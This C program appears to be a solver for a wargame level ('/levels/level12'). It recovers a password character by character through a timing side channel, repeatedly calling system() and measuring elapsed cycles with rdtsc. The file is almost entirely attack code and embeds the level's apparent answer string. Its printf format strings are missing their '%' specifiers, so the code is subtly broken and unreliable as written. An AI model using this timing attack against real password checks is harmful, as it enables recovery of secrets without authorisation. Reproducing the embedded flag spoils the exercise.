#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

#define rdtsc() ({ uint64_t x; asm volatile("rdtsc" : "=A" (x)); x; })
#define TRIALS 20 

char chars[] = "!abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
//char chars[] = "@drhswTpoGeltabmfuIiy@";

/* Results:
- SadeCvwJ@PlAttack@k
*/

int main(int argc, char **argv)
{
  int i, j;
  char test_str[] = "/levels/level12 Z                             AAAA";
  char *guess_ptr = strchr(test_str, 'Z');
  char result[20] = "";
  uint64_t best_time;
  char index = 0;
  uint64_t times[sizeof(chars)];
  char *answer = "S1deCh4nnelAttack3r ";

  printf("Doing a few blank tests to get things cached\n");
  for(i = 0; i < 50; i++)
    system(test_str);

  printf("Looping through the first two possible characters\n");
  for(index = 0; index < 20; index++)
  {
    if(answer[index] == ' ')
    {
      for(i = 0; chars[i]; i++)
      {
        uint64_t start, end;
        guess_ptr[index] = chars[i];
        printf("Index: d : Guess: s :: ", index, test_str);

        start = rdtsc();
        for(j = 0; j < TRIALS; j++)
          system(test_str);
        end = rdtsc();

        times[i] = end - start;
        printf("llu\n", times[i]);
      }

      best_time = times[0];
      result[index] = chars[0];
      for(i = 1; i < sizeof(chars); i++)
      {
        if(times[i] < best_time)
        {
          best_time = times[i];
          result[index] = chars[i];
        }
      }
    }
    else
    {
      result[index] = answer[index];
      printf("Result: s\n", result);
    }

    guess_ptr[index] = result[index];
    printf("Result so far: s\n", result);
    if(result[index] == '@')
      printf("Looks like something went wrong...\n");
  }

  return 0;
}
